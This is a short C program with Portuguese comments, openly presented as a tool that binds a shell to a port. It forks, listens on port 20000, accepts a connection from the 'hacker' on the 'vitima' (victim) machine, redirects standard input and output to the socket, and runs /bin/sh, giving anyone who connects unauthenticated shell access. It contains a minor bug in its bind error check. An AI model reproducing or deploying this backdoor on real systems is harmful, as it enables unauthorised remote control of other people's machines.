/* Simples programa que binda uma Shell a uma porta.
   Desenvolvido por Nash Leon vulgo coracaodeleao.
   nashleon@yahoo.com.br */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>

/* Leia o README se mudar o numero da porta */

#define  PORTA    20000
#define  ERRO        -1

int binda(){
int Meusocket;
int tamanho, conector;
struct sockaddr_in hacker;
struct sockaddr_in vitima;
char engana[50];

if(fork() == 0){
vitima.sin_family=AF_INET;
vitima.sin_addr.s_addr= htonl(INADDR_ANY);
vitima.sin_port= htons(PORTA);
bzero(&(vitima.sin_zero), 8);
Meusocket = socket(AF_INET,SOCK_STREAM,0);
if(Meusocket < 0){
fprintf(stderr,"Erro em socket()!\n");
exit(ERRO);
                 }
bind(Meusocket,(struct sockaddr *)&vitima,sizeof(vitima));
if(bind < 0){
fprintf(stderr,"Erro em bind()!\n");
exit(ERRO);
}
listen(Meusocket,1);
tamanho = sizeof(hacker);
conector=accept(Meusocket,(struct sockaddr *)&hacker,&tamanho);

if(conector < 0){
fprintf(stderr,"Erro em accept()!\n");
                }
dup2(conector,0);
dup2(conector,1);
dup2(conector,2);
execl("/bin/sh","sh",0);
}
}

main(void){
binda();
}

